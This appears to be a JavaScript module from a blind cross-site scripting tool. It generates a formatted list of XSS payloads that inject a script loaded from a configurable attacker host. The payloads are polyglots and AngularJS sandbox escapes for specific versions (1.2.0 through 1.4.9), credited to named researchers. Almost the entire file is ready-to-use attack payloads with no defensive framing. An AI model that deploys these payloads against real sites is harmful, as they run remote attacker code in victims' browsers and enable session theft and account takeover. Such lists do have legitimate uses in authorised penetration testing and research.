// TODO...
function buildPayloadStructure(payloads) {
  let structuredPayloads = '';
  payloads.map((payload) => {
    structuredPayloads += `Description: ${payload.description}\r\n${payload.payload}\r\n\r\n`;
    return structuredPayloads;
  });
  return structuredPayloads;
}

exports.generatePayloads = (config) => {
  const payloads = [
    { description: 'External JavaScript', payload: `"><script src="//${config.url}/m"></script>` },
    { description: 'JavaScript URI', payload: `<input value='javascript:eval("var _ = document.createElementNS('http://www.w3.org/1999/xhtml', 'script');_.setAttribute('src','//${config.url}/m');document.getElementsByTagName('body')[0].appendChild(_)")'></br>` },
    { description: 'PortSwigger - BurpSuite Polygot Payload', payload: `/*</script><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+((new(Image)).src=((new(Image)).src=([]+/\/${config.url}\/m/).replace(/\\/g,[]))//'>` },
    { description: 'crlf - https://polyglot.innerht.ml/ - Polygot Payload', payload: `"/*'/*\`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=eval("var _ = document.createElementNS('http://www.w3.org/1999/xhtml', 'script');_.setAttribute('src','//${config.url}/m');document.getElementsByTagName('body')[0].appendChild(_)")//>` },
    { description: 'Mario Heiderch - Angular Payload', payload: `{{constructor.constructor("var _ = document.createElementNS('http://www.w3.org/1999/xhtml', 'script');_.setAttribute('src','//${config.url}/m');document.getElementsByTagName('body')[0].appendChild(_)")()}} ` },
    { description: 'Lewis Ardern/Gareth Heyes - AngularJS Payload', payload: `{{$on.constructor("var _ = document.createElementNS('http://www.w3.org/1999/xhtml', 'script');_.setAttribute('src','//${config.url}/m');document.getElementsByTagName('body')[0].appendChild(_)")()}}` },
    { description: 'Jan Horn - 1.2.0 - 1.2.1 - AngularJS Payload', payload: `{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,"var _ = document.createElementNS('http://www.w3.org/1999/xhtml', 'script');_.setAttribute('src','//${config.url}/m');document.getElementsByTagName('body')[0].appendChild(_)")()}}`},
    { description: 'Jan Horn - 1.2.6 - 1.2.18 - AngularJS Payload', payload: `{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'eval("var _ = document.createElementNS(\\'http://www.w3.org/1999/xhtml\\',\\'script\\');_.setAttribute(\\'src\\',\\'//${config.url}/m\\');document.getElementsByTagName(\\'body\\')[0].appendChild(_)")')()}}`},
    { description: 'Mathias Karlsson - 1.2.19 - 1.2.23 (FireFox) AngularJS Payload', payload: `{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a",'eval("var _ = document.createElementNS(\\'http://www.w3.org/1999/xhtml\\',\\'script\\');_.setAttribute(\\'src\\',\\'//${config.url}/m\\');document.getElementsByTagName(\\'body\\')[0].appendChild(_)")'].sort(toString.constructor);}}`},
    { description: 'Gábor Molnár - 1.3.0 - AngularJS Payload', payload: `{{!ready && (ready = true) && (!call?$$watchers[0].get(toString.constructor.prototype):(a = apply)&&(apply = constructor)&&(valueOf = call)&&(''+''.toString('F=Function.prototype;'+'F.apply=F.a;'+'delete F.a;'+'delete F.valueOf;'+'eval("var _ = document.createElementNS(\\'http://www.w3.org/1999/xhtml\\',\\'script\\');_.setAttribute(\\'src\\',\\'//${config.url}/m\\');document.getElementsByTagName(\\'body\\')[0].appendChild(_)")')));}}`},
    { description: 'Gareth Heyes - 1.3.3 - 1.3.18 - AngularJS Payload', payload: `{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join; 'a'.constructor.prototype.charAt=[].join; $eval('x=1;eval(\`var _=document\\\\x2ecreateElement(\\'script\\');_\\\\x2esrc=\\'//${config.url}/m\\';document\\\\x2ebody\\\\x2eappendChild(_);\`)');}}`},
    { description: 'Gareth Heyes - 1.4.0 - 1.4.9 - AngularJS Payload', payload: `{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };eval("var _ = document.createElementNS(\\'http://www.w3.org/1999/xhtml\\', \\'script\\');_.setAttribute(\\'src\\',\\'//${config.url}/m\\');document.getElementsByTagName(\\'body\\')[0].appendChild(_)")//');}}`},
  ];
  const structured = buildPayloadStructure(payloads);

  return structured;
};
